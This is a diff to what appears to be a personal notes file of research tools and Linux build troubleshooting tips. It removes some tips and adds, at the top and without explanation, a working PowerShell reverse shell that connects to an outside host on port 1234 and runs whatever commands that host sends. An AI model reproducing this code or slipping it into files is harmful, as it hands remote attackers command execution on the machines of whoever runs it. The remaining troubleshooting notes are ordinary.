@@ -1,3 +1,26 @@
+shell.txt
+```
+$socket = new-object System.Net.Sockets.TcpClient('recon.wleberre.fr', 1234);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do{
+	$writer.Write("> ");
+	$writer.Flush();
+	$read = $null;
+	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
+	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+	if(!$out.equals("exit")){
+		$out = $out.split(' ')
+	        $res = [string](&$out[0] $out[1..$out.length]);
+		if($res -ne $null){ $writer.WriteLine($res)}
+	}
+}While (!$out.equals("exit"))
+$writer.close();$socket.close();
+````
+
 # Research tools
 1. IDAPro
 - [Download the free version from here](https://hex-rays.com/ida-free/)
@@ -81,10 +104,6 @@ Or, search in the cache,
 apt-cache search ripgrep
 ```
 
-**Find the changes made on a directory**
-```
-find ./sysdig/ -type f -exec stat --format="%Y %n" {} \; | sort -n 
-```
 
 **Vim hangs or stops**
 ```
@@ -350,44 +369,4 @@ checking for ber_free in -llber... no
 configure: error: zos remote support was requested but the openldap library was not found
 ```
 
-#### clang++-14 common error
- - Solution: install this dependency `sudo apt install libstdc++-8-dev`
 
-`lstdc++` not found.
-```
-End of search list.                                                                                                                                                                                                
- "/usr/bin/ld" -pie -z relro --hash-style=gnu --build-id --eh-frame-hdr -m elf_x86_64 -dynamic-linker /lib64/ld-linux-x86-64.so.2 -o p /usr/lib/x86_64-linux-gnu/Scrt1.o /usr/lib/x86_64-linux-gnu/crti.o /usr/bin/
- ../lib/gcc/x86_64-linux-gnu/8/crtbeginS.o -L/usr/include/x86_64-linux-gnu/c++/7 -L/usr/bin/../lib/gcc/x86_64-linux-gnu/8 -L/lib/x86_64-linux-gnu -L/lib/../lib64 -L/usr/lib/x86_64-linux-gnu -L/lib -L/usr/lib /tmp
- /publisher-c00099.o -lstdc++ -lm -lgcc_s -lgcc -lc -lgcc_s -lgcc /usr/bin/../lib/gcc/x86_64-linux-gnu/8/crtendS.o /usr/lib/x86_64-linux-gnu/crtn.o                                                                 
- /usr/bin/ld: cannot find -lstdc++                                                                                                                                                                                  
- clang: error: linker command failed with exit code 1 (use -v to see invocation)  
- ```
-
- `c++config` or, `iostream` not found
- ```
-/usr/include/c++/7/iostream:38:10: fatal error: 'bits/c++config.h' file not found                                                                                                                                  
-#include <bits/c++config.h>                                                                                                                                                                                        
-         ^~~~~~~~~~~~~~~~~~                                                                                                                                                                                        
-1 error generated.       
-```
-
- - Install the deps and change makefile not to use the deps
- ```
- sudo apt-get install libsdl2-dev libopencv-core-dev libopencv-videoio-dev libopencv-imgcodecs-dev libopencv-imgproc-dev libjsoncpp-dev
- ```
-
-Deps,
-```
-/usr/bin/ld: cannot find -lSDLWidgetsLib                                                                                                                                                                           
-/usr/bin/ld: cannot find -lopencv_core                                                                                                                                                                             
-/usr/bin/ld: cannot find -lopencv_videoio                                                                                                                                                                          
-/usr/bin/ld: cannot find -lopencv_imgcodecs                                                                                                                                                                        
-/usr/bin/ld: cannot find -lopencv_imgproc                                                                                                                                                                          
-/usr/bin/ld: cannot find -ljsoncpp
-```
-
-But this will not have `libSDLWidgetsLib`,
-```
-/usr/bin/ld: cannot find -lSDLWidgetsLib
-clang: error: linker command failed with exit code 1 (use -v to see invocation)
-```
